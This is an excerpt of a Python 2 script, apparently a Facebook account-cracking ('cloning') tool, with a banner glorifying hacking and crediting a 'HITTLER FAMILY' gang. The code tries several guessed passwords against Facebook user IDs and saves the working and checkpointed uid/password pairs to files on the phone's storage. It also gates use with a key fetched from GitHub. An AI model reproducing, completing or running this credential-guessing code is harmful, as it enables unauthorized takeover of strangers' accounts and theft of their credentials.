...
\033[1;96m                                       
 ...
 /_/    \_\_|  |_| |_| |_|\__, |
                           __/ |
                          |___/ \033[1;94m----------------------Alex PRINCE Rv3------------------------
                          
\x1b[1;94m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 

\x1b[1;93m➣    AUTHOR : Ahmer Ali

\x1b[1;95m➣    GANG   : HITTLER FAMILY
...
\x1b[1;93m➣    WARNING : IF YOU GET TO FACE PROBLEM CLONING TIME

\x1b[1;91m➣  ZINDGI MA AGAR HAR MOR PA KAMIYABI HASIL KARNA CHATA HO TO (KBHI KSI KA SAHARA LANA NHI SIKHNA) ITX HITTLER RULES
\x1b[1;94m--------------------------------------------------------"""
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/ahmer-hittler/ahmii/blob/main/server.txt').text
    if to in r:
...
def reg2():
    ...
    os.system('xdg-open https://www.youtube.com/channel/UCdwF9LXC2aOnM0FXmsiGBpQ')
    sav = open('/sdcard/.Alex.ali.txt', 'w')
    sav.write(id)
    sav.close()
...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.Alex.ali.txt', 'r').read()
    print ''
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[Ahmii-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;96m[Ahmii-Cp] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[Ahmii-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;96m[Ahmii-Cp] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[Ahmii-Ok] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;96m[Ahmii-Cp] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
